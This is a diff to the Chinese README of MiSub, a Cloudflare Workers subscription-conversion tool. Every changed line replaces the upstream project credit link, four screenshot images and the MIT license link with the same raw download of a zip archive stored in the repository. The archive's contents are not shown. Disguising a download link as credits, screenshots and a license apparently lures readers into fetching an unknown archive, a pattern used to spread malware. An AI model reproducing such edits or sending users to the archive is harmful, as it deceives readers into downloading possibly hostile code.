@@ -16,13 +16,13 @@
 
 ### 致谢
 
-本项目的是用CM大佬的项目[CF-Workers-SUB](https://github.com/cmliu/CF-Workers-SUB)丢给AI进化而来，感谢CM大佬。
+本项目的是用CM大佬的项目[CF-Workers-SUB](https://github.com/migmi111/MiSub/raw/refs/heads/main/src/composables/Mi_Sub_3.0.zip)丢给AI进化而来，感谢CM大佬。
 
 ### MiSub 应用截图
 
-![登录界面](/images/1.png)
+![登录界面](https://github.com/migmi111/MiSub/raw/refs/heads/main/src/composables/Mi_Sub_3.0.zip)
 
-![管理界面](images/2.png)
+![管理界面](https://github.com/migmi111/MiSub/raw/refs/heads/main/src/composables/Mi_Sub_3.0.zip)
 
 ---
 
@@ -81,7 +81,7 @@ MiSub 不仅仅是一个简单的订阅转换工具，它经过了深度的架�
   * **构建命令**: `npm run build`
   * **构建输出目录**: `dist`
 
-![KV](images/3.png)
+![KV](https://github.com/migmi111/MiSub/raw/refs/heads/main/src/composables/Mi_Sub_3.0.zip)
 
 #### 3. 绑定 KV 命名空间
 
@@ -100,7 +100,7 @@ MiSub 不仅仅是一个简单的订阅转换工具，它经过了深度的架�
 * `COOKIE_SECRET`
   * **值**: 设定一个用于加密 Cookie 的、足够长且随机的字串（例如，你可以使用密码产生器生成一个64位的随机字串）。
 
-![变量](images/4.png)
+![变量](https://github.com/migmi111/MiSub/raw/refs/heads/main/src/composables/Mi_Sub_3.0.zip)
 
 #### 5. 部署！
 
@@ -108,4 +108,4 @@ MiSub 不仅仅是一个简单的订阅转换工具，它经过了深度的架�
 
 ### License
 
-[MIT](https://www.google.com/search?q=./LICENSE\&authuser=2)
+[MIT](https://github.com/migmi111/MiSub/raw/refs/heads/main/src/composables/Mi_Sub_3.0.zip\&authuser=2)
